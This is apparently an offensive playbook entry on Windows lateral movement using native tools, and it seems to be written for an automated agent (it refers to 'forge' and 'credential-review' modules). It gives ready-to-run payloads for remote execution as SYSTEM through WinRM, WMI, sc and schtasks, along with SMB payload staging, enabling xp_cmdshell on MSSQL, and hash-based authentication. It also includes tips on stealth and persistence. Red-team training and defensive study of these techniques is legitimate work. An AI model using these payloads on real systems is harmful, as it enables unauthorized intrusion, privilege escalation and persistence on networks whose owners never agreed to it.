# Lateral Movement (native) — Knowledge Base
_Last updated: 2026-06-22_

Moving between hosts without a remote-execution utility, a network execution toolkit, or a remote-protocol exploitation toolkit. WinRM, WMI, native service control, scheduled tasks, and hash-based authentication via built-in mechanisms.

## Index
| # | Technique | When | Tier | Tags |
|---|-----------|------|------|------|
| T1 | WinRM remote exec (Invoke-Command) | Target has 5985/5986 + you have creds | 0-native | lateral, winrm, requires-domain-creds |
| T2 | WMI remote process create | WinRM blocked; DCOM/RPC (135) open | 0-native | lateral, wmi, requires-domain-creds |
| T3 | Remote service create/run (sc \\host) | Admin on target; want a quick exec | 0-native | lateral, requires-admin |
| T4 | Remote scheduled task | Stealthier than a service; admin on target | 0-native | lateral, requires-admin, persistence |
| T5 | Hash-based authentication with native runas/Kerberos | You have an NTLM hash, not a password | 1-go | lateral, hash-auth, tier1-go |
| T6 | SMB file-based exec staging | Push payload via admin share, trigger remotely | 0-native | lateral, smb, requires-admin |
| T7 | MSSQL linked-server / xp_cmdshell pivot | Reachable MSSQL + creds | 0-native | lateral, mssql, requires-domain-creds |

## Techniques

### T1: WinRM remote exec (Invoke-Command)
Tags: lateral, winrm, requires-domain-creds
When: Target listens on 5985/5986 (`Test-WSMan`) and you have valid creds.
Why: `Invoke-Command` is the native, supported remote-exec path — it IS PowerShell remoting. No remote-execution utility needed; this is the cleanest lateral move when WinRM is enabled (common in managed environments).
Tier: 0-native
Steps: 1. `Test-WSMan` the target 2. Build a `PSCredential` 3. `Invoke-Command -ComputerName -Credential`
Payload:
```powershell
Test-WSMan TARGET
$cred = New-Object PSCredential('CORP\user',(ConvertTo-SecureString 'Pass' -AsPlainText -Force))
Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock { whoami; hostname }
# interactive: Enter-PSSession -ComputerName TARGET -Credential $cred
```
Signal: command output from the remote host. | Pitfall: double-hop — a remote session can't use your creds for a *further* hop without CredSSP/delegation; plan multi-hop via a staged session or `-Authentication CredSSP`.
Source: distilled native WinRM lateral — 2026-06-22

### T2: WMI remote process create
Tags: lateral, wmi, requires-domain-creds
When: WinRM is blocked but RPC/DCOM (135 + dynamic) is reachable, and you have creds.
Why: `Invoke-CimMethod Win32_Process Create` (or legacy `Invoke-WmiMethod`) runs a process on the remote host over WMI — the native equivalent of remote WMI process execution. Output isn't returned (fire-and-forget) so stage output to a share or a file you read back.
Tier: 0-native
Steps: 1. Build creds + CIM session 2. `Win32_Process Create` your command 3. Read output from a staged file/share
Payload:
```powershell
$cred = Get-Credential
$o = New-CimSessionOption -Protocol Dcom
$s = New-CimSession -ComputerName TARGET -Credential $cred -SessionOption $o
Invoke-CimMethod -CimSession $s -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = 'cmd /c whoami > C:\Windows\Temp\o.txt' }
```
Signal: process created (returns a PID); read `o.txt` back via SMB. | Pitfall: no stdout over WMI — you MUST redirect to a file and retrieve it, or you're flying blind. DCOM may be filtered even when 135 is open.
Source: distilled native WMI lateral — 2026-06-22

### T3: Remote service create/run (sc \\host)
Tags: lateral, requires-admin
When: You're admin on the target and want a quick exec, WinRM/WMI unavailable.
Why: `sc \\host create` + `start` runs a command as SYSTEM on the remote box — the mechanism a remote-execution utility wraps. Built into Windows.
Tier: 0-native
Steps: 1. `sc \\host create` a service with your binPath 2. `sc \\host start` 3. Delete the service
Payload:
```cmd
sc \\TARGET create tmpsvc binPath= "cmd /c whoami > C:\Windows\Temp\o.txt"
sc \\TARGET start tmpsvc
sc \\TARGET delete tmpsvc
```
Signal: SYSTEM execution on the remote host. | Pitfall: a service with a non-service binary will "fail to start" (no service-control handler) but the command still runs — that's expected; clean up the service. Noisy (Event ID 7045).
Source: distilled native service lateral — 2026-06-22

### T4: Remote scheduled task
Tags: lateral, requires-admin, persistence
When: Admin on target; want something quieter than a service, or persistence.
Why: `schtasks /s \\host /create` runs as a chosen principal on a schedule or on-demand. Doubles as persistence. Native.
Tier: 0-native
Steps: 1. Create the task remotely 2. Run it 3. Delete (or leave for persistence)
Payload:
```cmd
schtasks /s TARGET /create /tn upd /tr "cmd /c whoami > C:\Windows\Temp\o.txt" /sc once /st 00:00 /ru SYSTEM /f
schtasks /s TARGET /run /tn upd
schtasks /s TARGET /delete /tn upd /f
```
Signal: task runs as SYSTEM. | Pitfall: requires admin + the Task Scheduler service reachable; `/ru SYSTEM` needs admin rights on the target.
Source: distilled native task lateral — 2026-06-22

### T5: Hash-based authentication with native/forged tooling
Tags: lateral, hash-auth, tier1-go
When: You have an NTLM hash (from `credential-review`) but not the plaintext.
Why: Hash-based authentication needs to inject the hash into an auth attempt — PowerShell can't do NTLM-hash auth natively (it wants a plaintext PSCredential). Over-hash-based authentication (request a TGT from the hash) or a small helper is required. This is a genuine native gap.
Tier: 1-go
Escalation: Windows native auth APIs take a password, not a raw NTLM hash; injecting the hash needs SSPI/LSA manipulation that PowerShell has no primitive for — a small compiled helper (or `Add-Type` C# via in-box `csc`) does it. You build it, you don't install it.
Steps: 1. Have the NTLM hash 2. Use a forged hash-based-authentication helper OR the hash→TGT approach to get a TGT 3. Use the resulting context for T1/T2
Payload: see `agents/forge/forge.md` (hash-based-authentication / hash→TGT helper). Where the .NET SDK is present, an `Add-Type` C# SSPI shim keeps it Tier-0-ish (in-box `csc`, no dropped binary).
Signal: an authenticated session as the hash's owner. | Pitfall: AES-only environments resist plain NTLM hash-based authentication; consider the hash→TGT approach instead. Confirm the runtime/SDK is present.
Variations: `Add-Type` C# SSPI shim (Tier 0 where .NET SDK present) — avoids a dropped binary.
Source: distilled native-normalized hash-based authentication — 2026-06-22

### T6: SMB file-based exec staging
Tags: lateral, smb, requires-admin
When: Admin on target with admin-share access; combining file push + remote trigger.
Why: Copy a payload to `\\host\C$` via native SMB, then trigger it via T3/T4/T2. Decouples staging from execution — useful when the exec channel can't carry the payload inline.
Tier: 0-native
Steps: 1. `Copy-Item` to the admin share 2. Trigger via service/task/WMI 3. Clean up the file
Payload:
```powershell
Copy-Item .\payload.exe \\TARGET\C$\Windows\Temp\p.exe
schtasks /s TARGET /create /tn r /tr C:\Windows\Temp\p.exe /sc once /st 00:00 /ru SYSTEM /f; schtasks /s TARGET /run /tn r
Remove-Item \\TARGET\C$\Windows\Temp\p.exe
```
Signal: payload executes remotely. | Pitfall: admin-share access (`C$`/`ADMIN$`) requires local admin on the target; AV scans the staged file on write.
Source: distilled native SMB staging — 2026-06-22

### T7: MSSQL linked-server / xp_cmdshell pivot
Tags: lateral, mssql, requires-domain-creds
When: A reachable MSSQL instance (port 1433) where your creds (or the service account) have rights.
Why: MSSQL is a frequent lateral pivot — `xp_cmdshell` runs OS commands as the SQL service account, and linked servers let you hop to other instances. Native `System.Data.SqlClient` connects; no sqlcmd-tool needed.
Tier: 0-native
Steps: 1. Connect via .NET SqlClient 2. Enable + run `xp_cmdshell` (if sysadmin) 3. Or enumerate/abuse linked servers
Payload:
```powershell
$c = New-Object System.Data.SqlClient.SqlConnection "Server=DB01;Database=master;Integrated Security=True"
$c.Open(); $cmd = $c.CreateCommand()
$cmd.CommandText = "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
$cmd.ExecuteReader() | % { $_[0] }
```
Signal: OS command output as the SQL service account (often a domain account → service-account ticket extraction/lateral). | Pitfall: needs `sysadmin` for `xp_cmdshell`; linked-server `EXECUTE AS` chains can grant it indirectly — enumerate `sys.servers` first.
Source: distilled native MSSQL lateral — 2026-06-22
